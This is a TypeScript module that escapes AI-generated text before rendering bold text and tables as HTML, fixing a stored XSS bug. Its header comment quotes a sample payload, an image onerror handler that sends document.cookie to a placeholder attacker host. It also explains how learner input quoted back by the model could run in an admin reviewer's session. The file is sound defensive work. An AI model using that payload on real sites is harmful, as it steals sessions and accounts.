// lib/render-ai-output.ts
// ─────────────────────────────────────────────────────────────────────────────
// Turning AI output into HTML without handing the page over to whoever wrote
// the prompt. Fixes docs/DEFERRED.md D-14.
//
// ── THE BUG ─────────────────────────────────────────────────────────────────
// Four render sites did this:
//
//     dangerouslySetInnerHTML={{ __html: text.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>') }}
//
// The substitution is harmless. The missing step is that `text` was never
// escaped, so every other tag in it reached the DOM intact. And `text` is not
// ours: it is a model's reply to text a LEARNER wrote. A learner who pastes
//
//     <img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">
//
// into the writing checker gets it quoted back in the report — these prompts
// ask the model to quote the learner's own words — and it executes. On
// /admin/reviews it executes in the reviewer's session, which is the account
// that can edit every learner's record. That is stored XSS with a privilege
// step, not a cosmetic issue.
//
// ── THE FIX, AND WHY THE ORDER IS THE WHOLE THING ───────────────────────────
// Escape FIRST, then insert our own tags into the escaped string. Escaping
// afterwards would destroy the very tags we just added, and sanitising by
// stripping known-bad tags is a denylist — it has to be right about every
// vector, forever, whereas escaping has to be right about five characters.
//
// The result is that the ONLY tags that can appear in the output are the ones
// this file writes. Nothing the model emits can add another.
//
// PURE: no imports, no DOM, no I/O. Exercised directly with real payloads by
// scripts/verify-ai-output-escaping.ts.
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Escape the five characters that let text become markup.
 *
 * `&` must be replaced first, or it would double-escape the entities the later
 * replacements produce.
 */
export function escapeHtml(input: string): string {
  return input
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

/**
 * AI output as HTML with `**bold**` honoured and nothing else.
 *
 * Use with `whiteSpace: 'pre-wrap'` on the container, which is how all four
 * call sites already render newlines.
 */
export function renderAiMarkup(input: string | null | undefined): string {
  if (!input) return '';
  return escapeHtml(input).replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
}

/**
 * The same, plus the pipe-table rows the writing checker's prompt asks for.
 *
 * Only that one call site needs this, but it lives here rather than inline so
 * it cannot be the one place that forgets to escape. The cells are sliced out
 * of the ALREADY-escaped string, so the interpolation below cannot introduce
 * markup — every tag and attribute in the template is written here.
 */
export function renderAiMarkupWithTables(input: string | null | undefined): string {
  if (!input) return '';

  return escapeHtml(input)
    .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
    .replace(/\|(.*)\|/g, (match) => {
      const cells = match.split('|').filter((c) => c.trim() && !c.includes('---'));
      if (cells.length === 0) return match;
      const spans = cells.map((c) => `<span>${c.trim()}</span>`).join('');
      return (
        '<div style="display:grid;grid-template-columns:auto 1fr 1fr 1fr;gap:8px;' +
        'padding:8px 0;border-bottom:1px solid var(--paper-line);font-size:0.8125rem">' +
        spans +
        '</div>'
      );
    });
}
